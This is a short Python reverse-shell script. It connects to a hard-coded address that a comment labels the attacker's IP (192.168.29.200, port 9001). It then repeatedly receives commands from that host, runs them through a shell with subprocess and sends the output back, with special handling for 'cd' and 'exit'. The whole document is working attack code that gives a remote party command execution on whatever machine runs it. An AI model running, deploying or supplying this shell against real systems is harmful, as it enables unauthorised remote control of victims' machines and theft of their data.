import socket
import subprocess
import os

# Setting up connection
target_ip = "192.168.29.200"  # Attacker IP
target_port = 9001  # Port

# Create a socket to connect back to the attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# Command execution loop
while True:
    # Receive command from attacker
    command = s.recv(1024).decode('utf-8')
    if command.lower() == "exit":
        break

    # Handle 'cd' manually
    if command.startswith('cd '):
        try:
            os.chdir(command[3:].strip())
            s.send(b"Changed directory to " + os.getcwd().encode() + b"\n")
        except FileNotFoundError:
            s.send(b"Directory not found\n")
        continue

    # Try to execute other commands
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output

    if output:
        s.send(output)
    else:
        s.send(b'Command executed successfully.\n')

# Close connection
s.close()
